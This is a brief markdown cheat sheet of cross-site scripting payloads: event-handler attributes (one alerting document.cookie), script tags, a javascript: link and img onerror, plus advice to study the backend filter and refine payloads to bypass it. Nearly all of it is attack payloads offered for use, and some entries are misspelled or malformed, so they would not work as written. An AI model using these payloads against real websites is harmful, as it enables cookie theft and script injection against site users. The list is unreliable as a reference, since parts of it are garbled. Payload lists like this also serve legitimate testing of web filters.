# XSS  all script depend on backend.
## so first understand the backend filter and make xss.
\<a onmouseover="alert(document.cookie)"\>xss link\</a\>
<script>alert(1)</script>
<xss onafterscripteceute="alert(1)"><script>1</script>
 
<a href="javascript:alert(1) ">xss</a>
<img src=x onerror='prompt(8)'>
<script ~~~>alert(0%0)</script ~~~>
 # improve the xss for bypass filter
 
